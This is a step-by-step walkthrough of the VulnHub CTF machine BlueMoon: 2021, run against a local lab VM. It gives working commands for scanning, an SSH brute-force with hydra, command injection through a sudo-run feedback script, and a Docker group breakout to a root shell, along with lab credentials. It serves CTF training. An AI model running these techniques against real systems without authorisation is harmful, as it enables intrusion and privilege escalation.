# 🌙 BlueMoon: 2021 - VulnHub Walkthrough

A detailed, step-by-step walkthrough of the **BlueMoon: 2021** CTF challenge from VulnHub. This repository documents the boot-to-root process, covering web enumeration, QR code decoding, custom password brute-forcing, lateral movement, and privilege escalation.

---

## 🛠️ Lab Environment

* **Attacker OS:** Kali Linux (`192.168.56.103`)
* **Target OS:** BlueMoon (`192.168.56.101`)
* **Network Setup:** Host-Only Adapter (QEMU/KVM / VirtualBox)

---

## 🛡️ Hacking Stages & Commands Reference

### 1. Reconnaissance & Scanning
Find the target IP on the network and scan for open ports/services:
```bash
# Host discovery
nmap -sn 192.168.56.0/24

# Port scanning
nmap -sC -sV -Pn -vv 192.168.56.101

# Directory enumeration
gobuster dir -u [http://192.168.56.101](http://192.168.56.101) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

2. Gaining Access (Exploitation)
Extract hidden credentials (userftp / ftpp@ssword) from a hidden QR code on the maintenance page, extract SSH wordlists from FTP, and brute-force the SSH service:

Bash
# Connect to FTP
ftp 192.168.56.101

# FTP commands to download credential lists
bin
get information.txt
get p_lists.txt
exit

# Brute-force SSH user 'robin'
hydra -l robin -P p_lists.txt ssh://192.168.56.101

# Access target via SSH (Password: k4rv3ndh4nh4ck3r)
ssh robin@192.168.56.101

3. Privilege Escalation & Lateral Movement
Abuse a feedback script to pivot to user jerry, then leverage Docker group permissions to escape the container environment and spawn a root shell:

Bash
# 1. Pivot to 'jerry' via script injection
sudo -u jerry /home/robin/project/feedback.sh
# Input 'test' for name, and '/bin/bash' for feedback

# 2. Upgrade to an interactive TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 3. Escape to root host via Docker breakout
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
🏆 Flags Captured
User Flag: Located at /home/jerry/user2.txt

Root Flag: Located at /root/root.txt
